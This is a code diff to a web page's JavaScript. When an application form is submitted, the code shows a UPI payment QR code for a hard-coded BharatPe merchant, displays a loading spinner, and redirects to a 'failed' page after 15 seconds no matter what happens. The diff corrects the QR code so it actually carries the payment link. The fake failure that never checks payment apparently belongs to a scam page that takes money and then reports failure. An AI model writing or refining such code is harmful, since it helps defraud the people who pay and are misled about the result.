@@ -428,25 +428,19 @@
 // Handle apply button click
 document.getElementById('applyForm').addEventListener('submit', function(event) {
   event.preventDefault();
-
-  // UPI Payment URL
-  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=`;
   const upiPaymentUrl = `upi://pay?pa=BHARATPE09905189929@yesbankltd&pn=BharatPe Merchant&cu=INR&tn=Pay To BharatPe Merchant&tr=QR`;
-
+  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiPaymentUrl)}`;
   document.getElementById('qrCodeImage').src = qrCodeUrl;
   document.getElementById('qrPaymentButton').href = upiPaymentUrl;
-
-  // Show the loading modal
   const loadingModal = new bootstrap.Modal(document.getElementById('loadingModal'));
   loadingModal.show();
 
-  // Redirect to failed page after 15 seconds
   setTimeout(() => {
     window.location.href = "failed.html";
   }, 15000);
 });
-
-      // Performance chart code
+    
+  // Performance chart code
   const ctx = document.getElementById('performanceChart').getContext('2d');
   const performanceChart = new Chart(ctx, {
     type: 'line',
